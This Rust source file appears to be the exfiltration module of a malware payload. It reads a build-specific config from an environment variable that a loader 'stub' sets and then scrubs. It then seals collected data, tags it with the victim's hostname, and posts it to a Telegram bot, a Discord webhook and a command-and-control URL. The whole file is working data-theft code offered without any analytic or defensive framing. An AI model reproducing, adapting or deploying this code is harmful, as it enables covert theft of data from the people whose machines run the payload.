use crate::crypto::seal;
use serde::{Deserialize, Serialize};
use std::sync::OnceLock;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Clone, Default, Serialize, Deserialize, Debug)]
pub struct ExfilConfig {
    #[serde(default)]
    pub discord_webhook: String,
    #[serde(default)]
    pub c2_url: String,
    #[serde(default)]
    pub c2_auth: String,
    #[serde(default)]
    pub telegram_token: String,
    #[serde(default)]
    pub telegram_chat: String,
}

static CONFIG: OnceLock<ExfilConfig> = OnceLock::new();

pub fn init(cfg: ExfilConfig) {
    let _ = CONFIG.set(cfg);
}

/// Read `SVC_EXFIL_CFG` from the environment, parse it as JSON, install
/// it as the live config, then scrub the env var. Called by the payload
/// on startup. The stub sets this env var before jumping into the
/// payload, so this is how per-build secrets reach the payload at
/// runtime without being compiled into the payload itself.
pub fn init_from_env() -> bool {
    let raw = match std::env::var("SVC_EXFIL_CFG") {
        Ok(v) => v,
        Err(_) => return false,
    };
    std::env::remove_var("SVC_EXFIL_CFG");

    let cfg: ExfilConfig = match serde_json::from_str(&raw) {
        Ok(c) => c,
        Err(_) => return false,
    };
    init(cfg);
    true
}

fn cfg() -> ExfilConfig {
    CONFIG.get().cloned().unwrap_or_default()
}

#[derive(Serialize)]
struct Envelope<'a, T: Serialize> {
    tag: &'a str,
    ts: f64,
    data: T,
}

pub fn exfil_event<T: Serialize>(tag: &str, data: T) {
    let env = Envelope {
        tag,
        ts: SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs_f64()).unwrap_or(0.0),
        data,
    };
    let raw = serde_json::to_vec(&env).unwrap_or_default();
    let sealed = seal(&raw);
    dispatch(tag, raw.len(), &sealed);
}

fn dispatch(tag: &str, raw_len: usize, sealed: &str) {
    let c = cfg();
    let host = crate::sysinfo::SysInfo::collect().hostname;

    if !c.telegram_token.is_empty() && !c.telegram_chat.is_empty() {
        let url = format!("https://api.telegram.org/bot{}/sendDocument", c.telegram_token);
        let body = format!(
            "tag={} bytes={} host={}\n{}",
            tag, raw_len, host, sealed
        );
        let form = reqwest::blocking::multipart::Form::new()
            .text("chat_id", c.telegram_chat.clone())
            .text("caption", format!("[{}] {}B {}", tag, raw_len, host))
            .part(
                "document",
                reqwest::blocking::multipart::Part::bytes(body.into_bytes())
                    .file_name(format!("{}_{}.txt", tag, fast_ts())),
            );
        let _ = reqwest::blocking::Client::new()
            .post(&url)
            .multipart(form)
            .timeout(std::time::Duration::from_secs(60))
            .send();
    }

    if !c.discord_webhook.is_empty() {
        if sealed.len() < 1800 {
            let msg = format!("[{}] {}B {}\n```{}```", tag, raw_len, host, sealed);
            let _ = reqwest::blocking::Client::new()
                .post(&c.discord_webhook)
                .json(&serde_json::json!({"content": msg}))
                .timeout(std::time::Duration::from_secs(8))
                .send();
        } else {
            let form = reqwest::blocking::multipart::Form::new()
                .part(
                    "file",
                    reqwest::blocking::multipart::Part::bytes(sealed.as_bytes().to_vec())
                        .file_name(format!("{}_{}.bin", tag, fast_ts())),
                );
            let _ = reqwest::blocking::Client::new()
                .post(&c.discord_webhook)
                .multipart(form)
                .timeout(std::time::Duration::from_secs(30))
                .send();
        }
    }

    if !c.c2_url.is_empty() {
        let _ = reqwest::blocking::Client::new()
            .post(&c.c2_url)
            .header("Authorization", format!("Bearer {}", c.c2_auth))
            .body(sealed.to_string())
            .timeout(std::time::Duration::from_secs(30))
            .send();
    }
}

fn fast_ts() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}
